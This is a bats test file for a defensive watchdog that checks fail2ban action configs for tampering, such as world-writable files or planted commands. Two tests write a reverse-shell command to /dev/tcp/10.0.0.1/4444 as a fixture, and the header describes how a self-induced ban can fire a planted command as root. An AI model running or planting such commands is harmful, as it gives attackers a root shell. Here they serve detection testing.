#!/usr/bin/env bats
# L2 bats functional tests for the fail2ban-action-watchdog scan script.
#
# fail2ban runs the action* directives (actionstart/actionban/actionunban/…)
# in /etc/fail2ban/action.d/*.conf AS ROOT on jail start and every ban/unban
# — and an attacker can self-induce a ban from a throwaway IP to fire a
# planted action command on demand (T1546). An action .conf that is
# world-writable / non-root-owned, or an action command carrying an injection
# pattern (incl. a writable-root path), is alert.
#
# Run with: bats packaging/test/L2-fail2ban-action-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/fail2ban-action-watchdog/systemd/fail2ban-action-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    ACTD="${TMP}/action.d"; mkdir -p "${ACTD}"
    CONF="${ACTD}/iptables.conf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_F2BACTION_PROFILE="${PROFILE:-report}" \
    SELFDEF_F2BACTION_BASELINE="${BASELINE}" \
    SELFDEF_F2BACTION_DIRS="${DIRS_V:-$ACTD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '[Definition]\nactionban = iptables -I f2b-sshd -s <ip> -j DROP\nactionunban = iptables -D f2b-sshd -s <ip> -j DROP\n' > "${CONF}"
}

@test "no fail2ban actions → ok / no_fail2ban_actions" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_fail2ban_actions"'
    cap | grep -q '"severity":"ok"'
}

@test "benign action conf, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged action conf on second run → ok / fail2ban_actions_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"fail2ban_actions_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an action command with an injection pattern → alert / fail2ban_actions_suspicious" {
    seed_benign
    run_wd
    printf '[Definition]\nactionban = bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"fail2ban_actions_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "an action command under a writable root → alert" {
    seed_benign
    run_wd
    printf '[Definition]\nactionstart = /tmp/.f2b-start\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable action conf → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign action change → warn / fail2ban_actions_changed" {
    seed_benign
    run_wd
    printf '[Definition]\nactionban = iptables -I f2b-sshd -s <ip> -j REJECT\nactionunban = iptables -D f2b-sshd -s <ip> -j REJECT\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"fail2ban_actions_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign iptables action conf is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious action command" {
    seed_benign
    run_wd
    printf '[Definition]\nactionban = bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
